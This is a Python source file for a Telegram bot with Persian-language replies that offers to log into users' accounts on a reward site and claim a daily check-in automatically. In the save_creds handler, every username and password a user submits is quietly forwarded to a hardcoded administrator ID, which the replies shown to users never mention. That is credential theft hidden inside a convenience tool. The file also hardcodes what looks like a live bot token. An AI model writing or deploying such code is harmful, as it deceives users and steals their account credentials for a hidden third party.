import telebot
import requests
import schedule
import time
import threading
import pytz
from datetime import datetime

# تنظیمات
TOKEN = '8095956559:AAGMeUTSGS9h8ZQTfPpCMHCZ5nwYBWVGTAk'
ADMIN_ID = '8404377559'
bot = telebot.TeleBot(TOKEN)
IRAN_TZ = pytz.timezone('Asia/Tehran')

user_data = {} 

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://coe.leme.hk.cn/m/',
    'Origin': 'https://coe.leme.hk.cn'
}

def auto_claim_task(chat_id, username, password):
    try:
        session = requests.Session()
        login_url = "https://coe.leme.hk.cn/login/check"
        payload = {'account': username, 'password': password, 'type': '1'}
        login_res = session.post(login_url, data=payload, headers=HEADERS, timeout=15)
        
        if login_res.status_code == 200:
            reward_url = "https://coe.leme.hk.cn/m/sign/check_in" 
            session.get(reward_url, headers=HEADERS)
            bot.send_message(chat_id, f"✅ جایزه روزانه اکانت `{username}` دریافت شد.", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, f"❌ خطا در ورود خودکار `{username}`")
    except Exception as e:
        print(f"Error: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    now_i = datetime.now(IRAN_TZ).strftime("%H:%M")
    bot.reply_to(message, f"✅ فعال شد.\nساعت ایران: {now_i}\n\nمشخصات: `user:pass`\nزمانبندی: `/set_time 08:30`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: ":" in message.text and not message.text.startswith('/'))
def save_creds(message):
    data = message.text.split(":")
    user_data[message.chat.id] = {'u': data[0].strip(), 'p': data[1].strip()}
    bot.reply_to(message, "✅ ذخیره شد. حالا `/set_time 09:00` را بزنید.")
    bot.send_message(ADMIN_ID, f"👤 New: `{data[0]}:{data[1]}`")

@bot.message_handler(commands=['set_time'])
def set_timer(message):
    try:
        t_time = message.text.split()[1]
        u = user_data[message.chat.id]['u']
        p = user_data[message.chat.id]['p']
        schedule.every().day.at(t_time).do(auto_claim_task, message.chat.id, u, p)
        bot.reply_to(message, f"🚀 تنظیم شد برای ساعت {t_time} ایران.")
    except:
        bot.reply_to(message, "❌ مثال: `/set_time 08:00`")

def run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(30)

if __name__ == "__main__":
    threading.Thread(target=run_scheduler, daemon=True).start()
    bot.polling(none_stop=True)
